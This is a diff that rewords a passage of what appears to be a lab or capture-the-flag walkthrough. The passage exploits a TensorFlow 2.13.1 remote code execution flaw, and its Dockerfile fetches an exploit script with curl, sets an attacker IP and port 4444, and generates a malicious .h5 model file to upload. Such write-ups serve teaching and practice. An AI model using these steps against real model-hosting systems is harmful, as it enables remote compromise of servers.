@@ -172,21 +172,21 @@ model.fit(X, y, epochs=100, verbose=1)
 model.save('profits_model.h5')
 ```
 
-After some digging on the web I find this RCE for Tensorflow 2.13.1: `https://github.com/Splinter0/tensorflow-rce`
+After some digging on the web I find this RCE exploit for Tensorflow 2.13.1: `https://github.com/Splinter0/tensorflow-rce`
 
-I add this to the `Dockerfile` build phase to download the RCE exploit and create a malicious h5 model containing a payload:
+I add this to the `Dockerfile` build phase to download the RCE exploit and create a malicious h5 model file containing a payload:
 ```
-# Download the exploit to generate a malicious h5 model containing a payload
+# Download the Tensorflow 2.13.1 RCE exploit
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
 
 # Replace the attacker IP and port
 RUN sed -i 's/127.0.0.1/10.10.14.9/g' exploit.py && sed -i 's/6666/4444/g' exploit.py
 
-# Generate the malicious h5 model containing the payload
+# Generate the malicious h5 model file containing the payload
 RUN python exploit.py
 ```
 
-Then, I use the `Dockerfile` to build and create a container containing the malicous h5 model with the payload.
+Then, I use the `Dockerfile` to build and create a container containing the infected h5 file.
 #### generate-payload.sh
 ```
 #!/bin/bash
@@ -207,4 +207,4 @@ CONTAINER_ID=$(sudo docker container ls -aq --filter "ancestor=generate-h5-paylo
 sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
 ```
 
-Once that's done, I upload the model:
+Once that's done, I upload the infected .h5:
